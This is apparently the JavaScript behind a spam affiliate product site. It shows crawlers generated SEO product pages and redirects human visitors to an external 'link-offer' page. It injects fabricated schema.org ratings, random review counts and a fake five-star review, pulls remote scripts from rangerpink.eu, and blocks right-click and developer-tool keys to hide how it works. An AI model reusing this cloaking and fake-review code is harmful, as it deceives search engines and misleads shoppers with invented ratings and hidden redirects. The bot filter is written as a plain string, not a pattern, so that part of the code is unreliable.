let url     = window.location.href,
	getid   = url.match(/\?id=([0-9]+)/),
	explode = url.split('/'),
	subdom  = explode[2];

if(getid != null){
	let id 			  = getid[1],
		user_agent    = navigator.userAgent,
		filter_bot 	  = '/google|bot|bing|yahoo|pinterest|yandex|facebook|webmaster|spider|crawlr/i',
		redirect_link = 'https://rangerpink-eu.blogspot.com/p/link-offer-1.html?id='+id+'&src='+subdom,
		server		  = 'https://rangerpink.eu';
		
	if (!user_agent.match(filter_bot)){
		window.location.replace(redirect_link);
	}

	let data_content = document.getElementById("d"),
		s 			 = document.createElement('script');
		   
	s.type = 'text/javascript';
	s.src  = server+'/content-'+randomInt(1,9)+'.php?id='+id+'&src='+subdom;
	data_content.innerHTML = '<div class="loading"></div>';
	data_content.appendChild(s); 

	function product(data) {
		if(data.result) {
			let item   = data.result,
				things = shuffle(["Big Discount","Big Promo","Discount","Free Shipping","Flash Sale","Wholesale","Cheapest","Promo","Unboxing","Review","Low Price","Best Price","Clearance","Crazy Deals"]),
				thing  = things[0];
			
			let productName = item.productName,
				productDesc = item.metaDesc,
				productImg  = item.productImage,
				storeName	= item.storeName ? item.storeName:subdom,
				productDiscount = item.productNewPrice,
				discount	= shuffle(["10","15","20","25","30","35","40","45","50","55","60","65","70","75","80","85","90"]),
				rating 		= shuffle(["3.7","3.8","3.9","4.0","4.1","4.2","4.3","4.4","4.5","4.6","4.7","4.8","4.9","5.0"]);
				
			let	allImages 	= item.allProductImage.toString(),
				splitImg 	= allImages.split(','),
				totalImg 	= splitImg.length;
			
			let judul 		= '<header><h1 class="title"><a href="" rel="noindex,nofollow" target="_blank" onclick="window.open(\''+redirect_link+'\')">'+'['+thing+'] '+productName.split(' ').splice(0,10).join(' ')+'</a></h1></header><hr>',
				navbar		= '<nav><ol class="breadcrumb text-center" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="'+window.location.origin+'"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="'+url+'"><span itemprop="name">'+productName.split(' ').splice(0,5).join(' ')+'</span></a><meta itemprop="position" content="2" /></li></ol></nav>',
				deskripsi 	= navbar+'<h2 class="deskripsi">'+productDesc+'</h2>',
				gambar		= '<a href="" rel="noindex,nofollow" target="_blank" onclick="window.open(\''+redirect_link+'\')"><img class="gambar" data-qazy="true" src="'+productImg+'" alt="'+productName+'" title="'+productName+'"></a><hr><div class="product-price"><a href="" rel="noindex,nofollow" type="submit" class="btn btn-sm price blink" onclick="window.open(\''+redirect_link+'\')"><i class="fa fa-chevron-circle-right" aria-hidden="true"></i> Check Details <i class="fa fa-chevron-circle-left" aria-hidden="true"></i></a></div><small>Last Update: '+tanggal()+'</small><hr>',
				fafifu		= '<hr><p class="text-justify">Buy <u>'+productName+'</u> from merchant '+storeName+' at affordable price and best quality. You can get up to '+discount[0]+'% off Discount when you purchase this product from our website, so you only have to pay '+productDiscount+' for <a href="'+window.location.origin+'" alt="'+productName+'" title="'+productName+'">'+productName+'</a>. We offers a wide variety of similar product so you can find just what you’re looking for, even some that you would never have imagined to find. We also have thousands of <i>'+productName+'</i> deals on '+subdom+', always with the high quality and best guarantee. Additionally, you can pick between the price range, the brand name, or the specs that you believe are crucial for your favorite product.</p><hr>',
				footer		= '<div class="footer text-center"> The results are displayed. Research by '+subdom+' is a link. Availability The price, details, specifications, photos and other information are the responsibility of the seller. Using the services of '+subdom+', you agree to comply with this provision.<br>&copy; <a href="'+window.location.origin+'" title="'+subdom+'" alt="'+subdom+'">'+subdom+'</a></div>';
				
			document.title = '['+thing+'] '+productName;
			document.querySelector('meta[name="description"]').content = item.metaDesc;
			document.querySelector('meta[name="keyword"]').content = item.metaKw;
			document.querySelector('link[rel="canonical"]').href = url; 
			
			let konten = judul+deskripsi+gambar;
			
			for(i=0;i<totalImg;i++){
				if(i<5){
					konten += '<a href="" rel="noindex,nofollow" target="_blank" onclick="window.open(\''+redirect_link+'\')"><img class="thumbnail" data-qazy="true" src="'+splitImg[i]+'_140x140q50.jpg_.webp" alt="'+productName+'" title="'+productName+'"><noscript><img src="'+splitImg[i]+'" alt="'+productName+'" title="'+productName+'"></noscript></a>';
				}
			} 
			 
			data_content.innerHTML = konten+fafifu;
					
			let snippets = [{
				'@context': 'https://schema.org/',
				'@type': 'Product',
				'name': '['+thing+'] '+productName,
				'image': productImg,
				'description': item.metaDesc,
				'sku': id,
				'mpn': id,
				'brand': 'Click for Details',
				'aggregateRating': {
					'@type': 'AggregateRating',
					'ratingValue': rating[0],
					'reviewCount': randomInt(100, 9000)
					},
				'offers': {
					'@type': 'Offer',
					'url': window.location.origin,
					'priceCurrency': 'USD',
					'price': '1',
					'priceValidUntil': '2098-12-31',
					'availability': 'https://schema.org/InStock',
					'seller': {
					  '@type': 'Organization',
					  'name': storeName
					}
				  },
				  'review':[ {
						'@type':'Review',
						'author':'A***Z',
						'datePublished':'2020-01-01',
						'description':'Awesome product, with free shipping & big discount. Thank you so much. Very very recomended seller, trusted',
						'name':'# 1 received by courier very quickly',
						'reviewRating': {
							'@type': 'Rating', 'bestRating': '5', 'ratingValue': 5, 'worstRating': '1'
						}
					}]
				}];
				let	s = document.createElement('script');
					s.type = 'application/ld+json';
					s.text = JSON.stringify(snippets);
				data_content.appendChild(s);
		}
	}
	
	$(function(){
		let server = 'https://rangerpink.eu';
		$("#c").load(server+"/details-"+randomInt(1,9)+".php?id="+id+"&src="+subdom);
	});
} else {
	let user_agent = navigator.userAgent,
		filter_bot = '/google|bot|bing|yahoo|pinterest|yandex|facebook|webmaster|spider|crawlr/i';

	if (user_agent.match(filter_bot)){
		let data_list_id = document.getElementById("i"),
			e 			 = document.createElement('script'),
			server		 = 'https://rangerpink.eu';

		e.type = 'text/javascript';
		e.src  = server+'/list-id-'+randomInt(1,9)+'.php?src='+subdom;
		data_list_id.innerHTML = '<div class="loading"></div>';
		data_list_id.appendChild(e); 

		function product(data) {
			if(data.result) {
				let list_id    = data.result,
					product_id = list_id.split(','),
					totalId	   = product_id.length,
					konten 	   = '',
					footer	   = '<div class="footer text-center"> The results are displayed. Research by '+subdom+' is a link. Availability The price, details, specifications, photos and other information are the responsibility of the seller. Using the services of '+subdom+', you agree to comply with this provision.<br>&copy; <a href="'+window.location.origin+'" title="'+subdom+'" alt="'+subdom+'">'+subdom+'</a></div>';
				
				for(i=0;i<totalId;i++){
					if(product_id[i]){
						konten += '<a href="/details.html?id='+product_id[i]+'" target="_blank">'+product_id[i]+'</a> | ';
					}
				}
				data_list_id.innerHTML = konten+footer;			
			}
		}
	}
}

function randomInt(min, max) { // min and max included 
  return Math.floor(Math.random() * (max - min + 1) + min);
}
function randomId(length) {
   var result           = '';
   var characters       = 'abcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}
function shuffle(array) {
	var currentIndex = array.length, temporaryValue, randomIndex;
	while (0 !== currentIndex) {
		randomIndex = Math.floor(Math.random() * currentIndex);
		currentIndex -= 1;
		temporaryValue = array[currentIndex];
		array[currentIndex] = array[randomIndex];
		array[randomIndex] = temporaryValue;
	}
	return array;
}
function tanggal() {
	var d = new Date(),
    minutes = d.getMinutes().toString().length == 1 ? '0'+d.getMinutes() : d.getMinutes(),
    hours = d.getHours().toString().length == 1 ? '0'+d.getHours() : d.getHours(),
    months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],
    days = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
return days[d.getDay()]+', '+d.getDate()+' '+months[d.getMonth()]+' '+d.getFullYear().toString().substr(-2)+' '+d.toLocaleTimeString();
}
function reveal() { for (var A = 0; A < view_elements.length; A++) { var q = 0, g = view_elements[A]; do isNaN(g.offsetTop) || (q += g.offsetTop); while (g = g.offsetParent); var B = window.pageYOffset, Q = window.innerHeight, C = 0, g = view_elements[A]; do isNaN(g.offsetLeft) || (C += g.offsetLeft); while (g = g.offsetParent); var I = window.pageXOffset, w = window.innerWidth; q > B && B + Q > q && C > I && I + w > C ? (view_elements[A].src = view_elements[A].getAttribute("data-qazy-src"), console.log(view_elements[A].src), view_elements.splice(A, 1), A--) : console.log("offsetParentTop" + q + " pageYOffset" + B + " viewportHeight" + window.innerHeight) } } function qazy_list_maker() { for (var A = document.querySelectorAll("img[data-qazy][data-qazy='true']"), q = 0; q < A.length; q++) { view_elements.push(A[q]), A[q].setAttribute("data-qazy", "false"); var g = A[q].src; A[q].setAttribute("data-qazy-src", g), A[q].src = qazy_image } } var qazy_image = qazy_image || "data:image/svg+xml;base64,PHN2ZyBjbGFzcz0ibGRzLW1lc3NhZ2UiIHdpZHRoPSI4MHB4IiAgaGVpZ2h0PSI4MHB4IiAgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB2aWV3Qm94PSIwIDAgMTAwIDEwMCIgcHJlc2VydmVBc3BlY3RSYXRpbz0ieE1pZFlNaWQiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDIwIDUwKSI+PGNpcmNsZSBjeD0iMCIgY3k9IjAiIHI9IjciIGZpbGw9IiNlMTViNjQiIHRyYW5zZm9ybT0ic2NhbGUoMC45OTI3NSAwLjk5Mjc1KSI+ICA8YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InNjYWxlIiBiZWdpbj0iLTAuMzc1cyIgY2FsY01vZGU9InNwbGluZSIga2V5U3BsaW5lcz0iMC4zIDAgMC43IDE7MC4zIDAgMC43IDEiIHZhbHVlcz0iMDsxOzAiIGtleVRpbWVzPSIwOzAuNTsxIiBkdXI9IjFzIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSI+PC9hbmltYXRlVHJhbnNmb3JtPjwvY2lyY2xlPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSg0MCA1MCkiPjxjaXJjbGUgY3g9IjAiIGN5PSIwIiByPSI3IiBmaWxsPSIjZjQ3ZTYwIiB0cmFuc2Zvcm09InNjYWxlKDAuNzczNjA1IDAuNzczNjA1KSI+ICA8YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InNjYWxlIiBiZWdpbj0iLTAuMjVzIiBjYWxjTW9kZT0ic3BsaW5lIiBrZXlTcGxpbmVzPSIwLjMgMCAwLjcgMTswLjMgMCAwLjcgMSIgdmFsdWVzPSIwOzE7MCIga2V5VGltZXM9IjA7MC41OzEiIGR1cj0iMXMiIHJlcGVhdENvdW50PSJpbmRlZmluaXRlIj48L2FuaW1hdGVUcmFuc2Zvcm0+PC9jaXJjbGU+PC9nPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDYwIDUwKSI+PGNpcmNsZSBjeD0iMCIgY3k9IjAiIHI9IjciIGZpbGw9IiNmOGIyNmEiIHRyYW5zZm9ybT0ic2NhbGUoMC40MjUyNSAwLjQyNTI1KSI+ICA8YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InNjYWxlIiBiZWdpbj0iLTAuMTI1cyIgY2FsY01vZGU9InNwbGluZSIga2V5U3BsaW5lcz0iMC4zIDAgMC43IDE7MC4zIDAgMC43IDEiIHZhbHVlcz0iMDsxOzAiIGtleVRpbWVzPSIwOzAuNTsxIiBkdXI9IjFzIiByZXBlYXRDb3VudD0iaW5kZWZpbml0ZSI+PC9hbmltYXRlVHJhbnNmb3JtPjwvY2lyY2xlPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSg4MCA1MCkiPjxjaXJjbGUgY3g9IjAiIGN5PSIwIiByPSI3IiBmaWxsPSIjYWJiZDgxIiB0cmFuc2Zvcm09InNjYWxlKDAuMTEzNDE4IDAuMTEzNDE4KSI+ICA8YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InNjYWxlIiBiZWdpbj0iMHMiIGNhbGNNb2RlPSJzcGxpbmUiIGtleVNwbGluZXM9IjAuMyAwIDAuNyAxOzAuMyAwIDAuNyAxIiB2YWx1ZXM9IjA7MTswIiBrZXlUaW1lcz0iMDswLjU7MSIgZHVyPSIxcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiPjwvYW5pbWF0ZVRyYW5zZm9ybT48L2NpcmNsZT48L2c+PC9zdmc+", view_elements = []; window.addEventListener("resize", reveal, !1), window.addEventListener("scroll", reveal, !1); var intervalObject = setInterval(function() { qazy_list_maker() }, 50); window.addEventListener("load", function() { clearInterval(intervalObject), qazy_list_maker(), reveal() }, !1);

document.addEventListener('contextmenu', event => event.preventDefault());

// To disable F12 options
document.onkeypress = function (event) {
	event = (event || window.event);
	if (event.keyCode == 123 || event.keyCode == 86 || event.keyCode == 85 || event.keyCode == 67 || event.keyCode === 17){
		return false;
	}
}
document.onmousedown = function (event) {
	event = (event || window.event);
	if (event.keyCode == 123 || event.keyCode == 86 || event.keyCode == 85 || event.keyCode == 67 || event.keyCode === 17) {
		return false;
	}
}
document.onkeydown = function (event) { 
	event = (event || window.event);
		if (event.keyCode == 123 || event.keyCode == 86 || event.keyCode == 85 || event.keyCode == 67 || event.keyCode === 17) {
		return false;
	}
}

// Statcounter
var sc_project=12384858; 
var sc_invisible=1; 
var sc_security="a5e8f7d2"; 
